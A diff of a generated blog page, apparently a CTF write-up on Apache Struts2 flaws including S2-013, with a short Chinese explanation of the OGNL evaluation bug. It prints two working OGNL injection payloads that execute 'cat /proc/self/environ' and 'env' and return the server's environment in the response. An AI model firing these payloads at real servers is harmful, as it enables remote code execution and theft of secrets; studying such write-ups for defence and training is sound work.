@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
@@ -323,7 +323,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/proc/self/environ&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
 
 <h1 id="WEB-285-S2-013"><a href="#WEB-285-S2-013" class="headerlink" title="WEB-285(S2-013)"></a>WEB-285(S2-013)</h1><p>原理：</p>
-<p>Apache Struts2的s:a和s:url标签都提供了一个includeParams属性。此属性允许使用的值包括none、get、all。当该属性被设置为get或all时，Apache Struts2会将用户提交的参数值作为Ognl表达式执行。攻击者可以提交带有恶意的Ongl表达式，达到执行任意Java代码的目的。只要基于Apache Struts2开发的JSP代码中使用了url/a标签并且设置了includeParams属性为all或get，远程攻击者即可利用此漏执行任意命令。</p>
+<p>Apache Struts2的s:a和s:url标签都提供了一个includeParams属性。此属性允许使用的值包括none、get、all。当该属性被设置为get或all时，Apache Struts2会将用户提交的参数值作为Ognl表达式执行。攻击者可以提交带有恶意的Ongl表达式，达到执行任意Java代码的目的。只要基于Apache Struts2开发的JSP代码中使用了url&#x2F;a标签并且设置了includeParams属性为all或get，远程攻击者即可利用此漏执行任意命令。</p>
 <p>payload: 参考:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266386#h3-3">https://www.anquanke.com/post/id/266386#h3-3</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link.action?fakeParam=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span><br></pre></td></tr></table></figure>
 
